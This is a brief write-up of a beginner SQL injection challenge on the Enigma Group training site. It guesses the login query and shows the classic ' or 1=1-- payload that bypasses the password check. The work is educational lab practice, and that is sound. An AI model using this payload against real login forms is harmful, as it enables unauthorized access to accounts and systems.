# [Basic 21](http://challenges.enigmagroup.org/basics/sql/1/)

First SQLi challenge so obviously we have a password field.

Since it is the first one and only a password, we can safely assume the query looks
like this:

`SELECT * FROM users WHERE username='admin' AND password='$PASS'`

Which means the trusty old `' or 1=1-- ` will bypass the need for a password

`SELECT * FROM users WHERE username='admin' AND passowrd='' OR 1=1-- `

We bypassed the login!
